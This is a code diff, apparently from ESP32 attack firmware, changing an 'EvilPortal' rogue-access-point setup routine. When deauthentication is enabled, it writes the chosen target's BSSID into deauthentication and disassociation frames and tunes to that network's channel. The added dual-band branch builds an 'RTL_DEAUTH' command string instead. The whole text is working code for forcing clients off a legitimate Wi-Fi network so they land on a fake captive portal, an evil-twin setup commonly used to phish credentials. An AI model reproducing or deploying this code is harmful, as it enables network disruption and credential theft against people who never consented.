@@ -25,6 +25,7 @@ class CaptiveRequestHandler : public AsyncWebHandler {
 };
 
 uint8_t deauth_frame[sizeof(wifi.deauth_frame_packet)];
+String str_deauth_frame = "";
 uint8_t disassoc_frame[sizeof(wifi.disassoc_frame_packet)];
 
 
@@ -164,15 +165,21 @@ bool EvilPortalAddtional::apSetup(String essid, bool _deauth) {
         for (int i = 0; i < access_points->size(); i++) {
             if (access_points->get(i).selected) {
                 if (_deauth) {
-                    memcpy(deauth_frame, wifi.deauth_frame_packet, sizeof(wifi.deauth_frame_packet));
-                    memcpy(disassoc_frame, wifi.disassoc_frame_packet, sizeof(wifi.disassoc_frame_packet));
-                    esp_wifi_set_channel(access_points->get(i).channel, WIFI_SECOND_CHAN_NONE);
-                    vTaskDelay(50 / portTICK_PERIOD_MS);
-                    memcpy(&deauth_frame[10], access_points->get(i).bssid, 6);
-                    memcpy(&deauth_frame[16], access_points->get(i).bssid, 6);
+                    if (!wifi.dualBandInList) {
+                        memcpy(deauth_frame, wifi.deauth_frame_packet, sizeof(wifi.deauth_frame_packet));
+                        memcpy(disassoc_frame, wifi.disassoc_frame_packet, sizeof(wifi.disassoc_frame_packet));
+                        esp_wifi_set_channel(access_points->get(i).channel, WIFI_SECOND_CHAN_NONE);
+                        vTaskDelay(50 / portTICK_PERIOD_MS);
+                        memcpy(&deauth_frame[10], access_points->get(i).bssid, 6);
+                        memcpy(&deauth_frame[16], access_points->get(i).bssid, 6);
 
-                    memcpy(&disassoc_frame[10], access_points->get(i).bssid, 6);
-                    memcpy(&disassoc_frame[16], access_points->get(i).bssid, 6);
+                        memcpy(&disassoc_frame[10], access_points->get(i).bssid, 6);
+                        memcpy(&disassoc_frame[16], access_points->get(i).bssid, 6);
+                    } else {
+                        str_deauth_frame = "RTL_DEAUTH -am {";
+                        String src_mac = macToString(access_points->get(i).bssid); // BSSID
+                        str_deauth_frame += src_mac + "} -c {" + String(access_points->get(i).channel) + "}";
+                    }
                 }
                 ap_name = access_points->get(i).essid;
                 break;
